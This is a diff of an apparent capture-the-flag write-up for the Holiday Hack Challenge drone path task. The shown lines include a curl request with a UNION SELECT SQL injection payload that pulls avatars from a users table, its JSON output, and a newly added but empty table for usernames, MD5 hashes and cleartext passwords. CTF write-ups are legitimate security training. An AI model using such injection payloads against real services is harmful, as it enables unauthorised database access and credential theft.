@@ -55,9 +55,16 @@ curl "https://hhc24-dronepath.holidayhackchallenge.com//api/v1.0/drones?drone=Za
 
 curl "https://hhc24-dronepath.holidayhackchallenge.com//api/v1.0/drones?drone=Zapper'%20UNION%20SELECT%20avatar%2c1%2c1%20FROM%20users%3b--"
 [{"name":"2cf1d29136d246eeb42149e65358abb3.png","quantity":1,"weapons":1},{"name":"Zapper","quantity":"5","weapons":"CarrotSpike"},{"name":"elf13.png","quantity":1,"weapons":1},{"name":"elf17.png","quantity":1,"weapons":1},{"name":"elf23.png","quantity":1,"weapons":1},{"name":"elf3.png","quantity":1,"weapons":1},{"name":"elf5.png","quantity":1,"weapons":1},{"name":"elf6.png","quantity":1,"weapons":1}]
-
 `
+
+So we have the Elf "fritjolf" and the Troll "Pip":
+|User|Avatar|Password MD5|Password clear|
+|--|--|--|
+|  |  |
+|--|--|
+|  |  |
+
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTg0NjU0NzYzLDIwODMxMjk3MDksNDI5OD
-cwOTY1XX0=
+eyJoaXN0b3J5IjpbMTYzMTA5NTAyOCwyMDgzMTI5NzA5LDQyOT
+g3MDk2NV19
 -->
